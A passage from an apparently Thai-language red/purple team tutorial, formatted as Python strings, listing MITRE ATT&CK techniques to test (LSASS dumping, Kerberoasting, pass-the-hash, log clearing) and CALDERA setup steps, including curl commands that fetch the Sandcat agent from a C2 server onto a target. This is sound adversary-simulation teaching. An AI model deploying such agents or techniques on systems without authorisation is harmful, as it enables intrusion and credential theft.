   [ ] Assigned to right team?

4. Response
   [ ] SOP exists for this alert?
   [ ] Team knows how to respond?
   [ ] Can contain/remediate in reasonable time?

Techniques to Test per Phase:

Initial Access:
  T1566 - Phishing
  T1190 - Exploit public-facing app

Execution:
  T1059 - PowerShell/CMD execution
  T1047 - WMI execution
  T1053 - Scheduled tasks

Persistence:
  T1547 - Registry Run Keys
  T1543 - New Windows Service

PrivEsc:
  T1548 - UAC Bypass
  T1055 - Process Injection

Defense Evasion:
  T1070 - Log clearing
  T1036 - Masquerading

Credential Access:
  T1003 - LSASS dump
  T1558 - Kerberoasting

Lateral Movement:
  T1021 - RDP/SMB/WinRM
  T1550 - PtH/PtT
"""

print(PURPLE_TEAM_CONCEPT)
print(DETECTION_VALIDATION)

# Caldera setup for automated adversary simulation
CALDERA_SETUP = """
=== CALDERA Adversary Simulation Platform ===
# https://github.com/mitre/caldera

# Install
git clone https://github.com/mitre/caldera.git --recursive
cd caldera && pip install -r requirements.txt
python server.py --insecure

# Deploy agent on target
# Sandcat (Windows)
curl -s -X POST http://caldera:8888/file/download -d '{"file": "sandcat.go","platform": "windows"}' > sandcat.exe

# Sandcat (Linux)
curl -s -X POST http://caldera:8888/file/download -d '{"file": "sandcat.go","platform": "linux"}' > sandcat

# Select adversary profile and run operation
# Web UI: http://localhost:8888
"""
print(CALDERA_SETUP)
```

---
*Part 34 เสร็จสมบูรณ์ - Steps 331-340 ครอบคลุม Red Team Methodology, C2 Framework Setup, OPSEC, Phishing Infrastructure, AD Attack Chains, EDR/AV Evasion, Covert Channels, Red Team Toolset, Red Team Reporting และ Purple Team Exercises*
